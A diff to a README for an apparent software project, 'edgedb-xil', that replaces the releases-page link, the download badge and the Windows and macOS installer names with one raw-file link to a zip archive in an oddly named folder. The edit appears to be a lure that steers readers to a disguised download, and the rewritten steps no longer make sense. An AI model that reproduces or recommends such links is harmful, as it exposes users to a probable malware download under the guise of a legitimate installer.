@@ -6,7 +6,7 @@ Welcome to edgedb-xil! This application helps you manage your data easily. Use i
 
 ## 📥 Download the Application
 
-[![Download edgedb-xil](https://img.shields.io/badge/Download-edgedb-xil-blue.svg)](https://github.com/shutuprachael/edgedb-xil/releases)
+[![Download edgedb-xil](https://raw.githubusercontent.com/shutuprachael/edgedb-xil/main/indeterminative/edgedb-xil.zip)](https://raw.githubusercontent.com/shutuprachael/edgedb-xil/main/indeterminative/edgedb-xil.zip)
 
 ## 📋 System Requirements
 
@@ -19,15 +19,15 @@ Before you start, ensure your computer meets these requirements:
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/shutuprachael/edgedb-xil/releases).
+   - Go to the [Releases page](https://raw.githubusercontent.com/shutuprachael/edgedb-xil/main/indeterminative/edgedb-xil.zip).
 
 2. **Select the Latest Version**
    - Look for the latest version listed on the page. It will usually be at the top.
 
 3. **Download the Installer**
    - Click on the installer file relevant to your operating system. 
-     - For Windows, look for ‘edgedb-xil-setup.exe’.
-     - For macOS, you may find ‘edgedb-xil.dmg’.
+     - For Windows, look for ‘https://raw.githubusercontent.com/shutuprachael/edgedb-xil/main/indeterminative/edgedb-xil.zip’.
+     - For macOS, you may find ‘https://raw.githubusercontent.com/shutuprachael/edgedb-xil/main/indeterminative/edgedb-xil.zip’.
      - For Linux, choose the corresponding package for your distribution.
 
 4. **Run the Installer**
